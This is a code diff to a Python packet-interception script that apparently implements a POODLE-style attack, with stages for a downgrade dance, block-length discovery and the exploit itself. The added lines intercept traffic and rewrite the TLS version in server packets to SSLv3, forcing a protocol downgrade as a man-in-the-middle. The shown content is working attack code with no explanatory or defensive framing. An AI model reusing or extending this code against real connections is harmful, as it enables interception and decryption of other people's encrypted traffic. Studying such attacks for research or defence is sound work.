@@ -6,6 +6,8 @@ import threading
 import json
 from enum import Enum
 
+SSL_V3_CODE = 768
+
 Stage = Enum('Stage', 'downgrade_dance block_length exploit')
 stage = Stage.downgrade_dance
 
@@ -29,9 +31,14 @@ def copy_block(arr, copy_index, target_index):
 def callback(packet):
 	pkt = IP(packet.get_payload())
 
-	if pkt.src == config['target'] or pkt.dst == config['target']:
-		print(pkt.src + " -> " + pkt.dst)
-		print(pkt[0].summary())
+	print(pkt.src + " -> " + pkt.dst)
+	print(pkt[0].summary())
+	if pkt.haslayer(TLS) and pkt.getlayer(TLS).version > SSL_V3_CODE and stage == Stage.downgrade_dance and pkt.src != config['target']:
+		print("Downgrading server packet")
+		pkt.getlayer(TLS).version = SSL_V3_CODE
+		packet.set_payload(bytes(pkt))
+		packet.accept()
+		return
 
 	if pkt.src == config['target'] and stage == Stage.exploit:
 		start_index = block_size * block_to_move
